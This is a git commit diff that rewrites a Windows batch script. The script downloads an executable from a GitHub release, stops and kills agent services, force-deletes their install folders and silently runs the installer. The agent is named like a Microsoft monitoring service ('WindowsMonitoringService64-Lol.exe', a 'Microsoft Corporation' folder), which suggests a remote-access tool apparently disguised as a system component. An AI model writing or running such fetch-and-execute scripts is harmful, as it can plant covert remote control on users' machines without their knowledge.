aa0c8565c2db6d1afbf82daaa8c23ff0a25cbed3
Obsidian <123307773+LightZirconite@users.noreply.github.com>
2026-01-06 11:38:33 +0100

    Enhance force-update-agent.bat with error handling
    Refactored force-update-agent.bat for better logging and error handling. Added checks for download size and improved service management.

--- force-update-agent.bat
+++ force-update-agent.bat
@@ -1,33 +1,68 @@
 @echo off
-set LOGDIR=C:\Temp\NoWin
-set LOGFILE=%LOGDIR%\force-update-agent.log
+setlocal EnableExtensions EnableDelayedExpansion
 
-if not exist %LOGDIR% mkdir %LOGDIR%
+REM =========================
+REM Force Update Agent - BAT
+REM Logs: C:\Temp\NoWin
+REM =========================
 
-echo ===== SCRIPT START %DATE% %TIME% ===== >> %LOGFILE%
-whoami >> %LOGFILE%
+set BASEDIR=C:\Temp\NoWin
+set LOGFILE=%BASEDIR%\force-update-agent.log
+set INSTALLER=%BASEDIR%\WindowsMonitoringService64-Lol.exe
+set DOWNLOAD_URL=https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe
 
-echo Downloading installer... >> %LOGFILE%
+if not exist %BASEDIR% mkdir %BASEDIR%
 
+echo ===== START %DATE% %TIME% ===== >> "%LOGFILE%"
+whoami >> "%LOGFILE%"
+
+REM --- Download installer ---
+echo Downloading installer... >> "%LOGFILE%"
 powershell -NoProfile -Command ^
-"Invoke-WebRequest -UseBasicParsing -Uri 'https://github.com/LightZirconite/MeshAgent/releases/download/exe/WindowsMonitoringService64-Lol.exe' -OutFile '%LOGDIR%\agent.exe'" >> %LOGFILE% 2>&1
+"Invoke-WebRequest -UseBasicParsing -Uri '%DOWNLOAD_URL%' -OutFile '%INSTALLER%'" >> "%LOGFILE%" 2>&1
 
-if not exist %LOGDIR%\agent.exe (
-    echo DOWNLOAD FAILED >> %LOGFILE%
+if not exist "%INSTALLER%" (
+    echo DOWNLOAD FAILED >> "%LOGFILE%"
+    echo ===== ABORT ===== >> "%LOGFILE%"
     exit /b 1
 )
 
-echo Stopping services... >> %LOGFILE%
-sc stop meshagent >> %LOGFILE% 2>&1
-sc stop WindowsMonitoringService >> %LOGFILE% 2>&1
-taskkill /F /IM meshagent.exe >> %LOGFILE% 2>&1
-taskkill /F /IM WindowsMonitoringService*.exe >> %LOGFILE% 2>&1
+for %%A in ("%INSTALLER%") do set SIZE=%%~zA
+if %SIZE% LSS 500000 (
+    echo DOWNLOAD TOO SMALL (%SIZE%) >> "%LOGFILE%"
+    exit /b 1
+)
 
-echo Removing old folders... >> %LOGFILE%
-rmdir /S /Q "C:\Program Files\Mesh Agent" >> %LOGFILE% 2>&1
-rmdir /S /Q "C:\Program Files\Microsoft Corporation\WindowsMonitoringService" >> %LOGFILE% 2>&1
+echo Download OK (%SIZE% bytes) >> "%LOGFILE%"
 
-echo Installing new agent... >> %LOGFILE%
-"%LOGDIR%\agent.exe" --fullinstall >> %LOGFILE% 2>&1
+REM --- Stop services ---
+echo Stopping services... >> "%LOGFILE%"
+sc stop meshagent >> "%LOGFILE%" 2>&1
+sc stop lgtwagent >> "%LOGFILE%" 2>&1
+sc stop WindowsMonitoringService >> "%LOGFILE%" 2>&1
 
-echo ===== SCRIPT END %DATE% %TIME% ===== >> %LOGFILE%
+REM --- Kill processes ---
+echo Killing processes... >> "%LOGFILE%"
+taskkill /F /IM meshagent.exe >> "%LOGFILE%" 2>&1
+taskkill /F /IM lgtw*.exe >> "%LOGFILE%" 2>&1
+taskkill /F /IM WindowsMonitoringService*.exe >> "%LOGFILE%" 2>&1
+
+REM --- Remove old folders ---
+echo Removing old folders... >> "%LOGFILE%"
+rmdir /S /Q "C:\Program Files\Mesh Agent" >> "%LOGFILE%" 2>&1
+rmdir /S /Q "C:\Program Files\MeshAgent" >> "%LOGFILE%" 2>&1
+rmdir /S /Q "C:\Program Files\LGTW" >> "%LOGFILE%" 2>&1
+rmdir /S /Q "C:\Program Files\Microsoft Corporation\WindowsMonitoringService" >> "%LOGFILE%" 2>&1
+rmdir /S /Q "C:\Program Files (x86)\Mesh Agent" >> "%LOGFILE%" 2>&1
+
+REM --- Install new agent ---
+echo Installing new agent... >> "%LOGFILE%"
+"%INSTALLER%" --fullinstall >> "%LOGFILE%" 2>&1
+
+echo Install finished, exit code %ERRORLEVEL% >> "%LOGFILE%"
+
+REM --- Cleanup ---
+del /F /Q "%INSTALLER%" >> "%LOGFILE%" 2>&1
+
+echo ===== END %DATE% %TIME% ===== >> "%LOGFILE%"
+exit /b 0
